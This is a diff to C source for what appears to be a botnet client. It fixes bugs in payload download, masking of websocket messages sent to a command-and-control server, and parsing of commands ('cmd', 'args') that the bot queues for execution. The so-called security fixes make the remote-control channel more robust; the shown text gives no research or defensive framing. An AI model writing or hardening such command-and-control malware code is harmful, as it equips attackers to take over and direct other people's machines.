@@ -461,7 +461,10 @@ int http_read(notnet_bot_t *bot, char *buf, int len) {
 }
 
 int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
-    char buf[PAYLOAD_MAX_SIZE];
+    /* SECURITY FIX (#23): Use a static buffer instead of 1MB stack
+     * allocation (PAYLOAD_MAX_SIZE). A stack variable this large causes
+     * stack overflow on most systems. */
+    static char buf[PAYLOAD_MAX_SIZE];
     int len = http_get(bot, buf, sizeof(buf));
     if (len <= 0) return -1;
     
@@ -634,15 +637,22 @@ int ws_send(notnet_bot_t *bot, const char *data, int len) {
     hdr_len += 4;
 
     /* Copy data to a temp buffer for masking */
-    char masked[2048];
+    /* SECURITY FIX (#25): Use dynamic allocation for masked payload to
+     * avoid silent truncation of messages > 2048 bytes. */
     int send_len = len;
-    if (send_len > (int)sizeof(masked)) send_len = sizeof(masked);
+    char *masked = (char *)malloc(send_len);
+    if (!masked) {
+        log_error("ws_send: malloc failed for %d bytes", send_len);
+        return -1;
+    }
     memcpy(masked, data, send_len);
     ws_apply_mask((uint8_t *)masked, send_len, mask);
 
     /* Send header + masked payload */
     send(bot->c2_ws.sock, header, hdr_len, 0);
-    return send(bot->c2_ws.sock, masked, send_len, 0);
+    int result = send(bot->c2_ws.sock, masked, send_len, 0);
+    free(masked);
+    return result;
 }
 
 int ws_read(notnet_bot_t *bot, char *buf, int len) {
@@ -796,8 +806,13 @@ int protocol_process_commands(notnet_bot_t *bot) {
         int result = http_read(bot, http_buf, sizeof(http_buf));
         if (result > 0) {
             log_info("HTTP: http_read returned %d bytes", result);
-            /* Parse JSON command from response */
-            char *cmd_key = strstr(http_buf, "\"cmd\"");
+            /* SECURITY FIX (#24): Skip HTTP headers before parsing JSON.
+             * Headers may contain "cmd" in unexpected places. */
+            char *body = strstr(http_buf, "\r\n\r\n");
+            if (body) body += 4;
+            else body = http_buf;
+            /* Parse JSON command from response body only */
+            char *cmd_key = strstr(body, "\"cmd\"");
             if (cmd_key) {
                 char cmd[128];
                 snprintf(cmd, sizeof(cmd), "%s", cmd_key + 6);
@@ -810,8 +825,8 @@ int protocol_process_commands(notnet_bot_t *bot) {
                         memset(bot->cmd_queue[bot->cmd_count], 0, 256);
                         strncpy(bot->cmd_queue[bot->cmd_count], start + 1, clen);
                         bot->cmd_queue[bot->cmd_count][clen] = '\0';
-                        /* Extract "args" value and append to command */
-                        char *args_key = strstr(http_buf, "\"args\"");
+                        /* Extract args value and append to command */
+                        char *args_key = strstr(body, "\"args\"");
                         if (args_key) {
                             /* Find colon after "args" (6 chars), then skip to opening quote of value */
                             char *colon = strchr(args_key + 6, ':');
